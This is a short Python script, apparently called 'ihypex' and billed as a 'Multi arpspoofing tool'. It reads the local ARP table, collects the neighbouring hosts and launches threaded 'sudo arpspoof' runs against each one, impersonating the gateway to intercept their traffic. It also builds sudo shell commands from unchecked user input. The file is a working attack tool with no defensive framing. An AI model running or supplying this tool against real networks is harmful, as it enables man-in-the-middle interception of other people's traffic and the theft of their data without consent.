#!/usr/bin/env python3

from colorama import init, Fore, Back, Style
import rlcompleter,gnureadline
import threading
from argparse import ArgumentParser
import os

banner="""

    _ __                              
   (_) /_  __  ______  ___  ______  __
  / / __ \/ / / / __ \/ _ \/ ___/ |/_/
 / / / / / /_/ / /_/ /  __/ /  _>  <  
/_/_/ /_/\__, / .___/\___/_/  /_/|_|  
        /____/_/                      

Multi arpspoofing tool....
"""

def set_neigh(iface,lan):
    try:
        arp_cmd="""sudo /bin/bash -c 'arp -i {} | grep {} | cut -d " " -f1 | grep -E "\." > ips.txt'""".format(iface,lan)
        os.system(arp_cmd)
    except Exception as err:
        print('Something went wrong about the CMD sintax')
        exit()

def get_neigh(iface,gw):
    f_ips=open('ips.txt','r')
    threads=[]
    ip_table=[]

    for ip in f_ips:
        cidr=ip.split(" ")[0]
        ip_table.append(cidr)

    f_ips.close()
    ip_table.remove('192.168.1.1')
    for ip in ip_table:
        print(Fore.WHITE+'----------------------')
        print(ip.strip() + Fore.GREEN+" Found")
        new_thread=threading.Thread(target=spoof, args=(iface,ip,gw))
        threads.append(new_thread)
        new_thread.start()

def spoof(iface,ip,gw):
    try:
        spoof_cmd=""" sudo /bin/bash -c 'arpspoof -i {} -t {} -r {}' """.format(iface,ip,gw)
        os.system(spoof_cmd)
    except Exception as err:
        print(err)
        pass

if __name__=='__main__':
    print(banner)
    iface = input("Enter the interface name to use-> ".strip())
    lan = input("Enter de LAN to spoof (x.x.x)-> ".strip())    
    gw = input("Enter the gateway to subsitute-> ".strip())
    print('READING ARP TABLE\n++++++++++++++++++++++')
    set_neigh(iface,lan)
    get_neigh(iface,gw)